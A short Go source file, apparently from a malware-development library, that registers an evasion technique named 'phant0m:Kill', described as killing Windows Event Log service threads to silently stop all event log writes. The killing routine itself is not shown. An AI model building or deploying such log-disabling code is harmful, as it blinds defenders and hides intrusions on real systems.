//go:build windows

package phant0m

import "github.com/oioio-space/maldev/evasion"

type killTechnique struct{}

func (killTechnique) Name() string                  { return "phant0m:Kill" }
func (killTechnique) Apply(c evasion.Caller) error  { return Kill(evasion.AsCaller(c)) }

// Technique returns an evasion.Technique that kills Windows Event Log
// service threads, silently stopping all event log writes.
func Technique() evasion.Technique { return killTechnique{} }
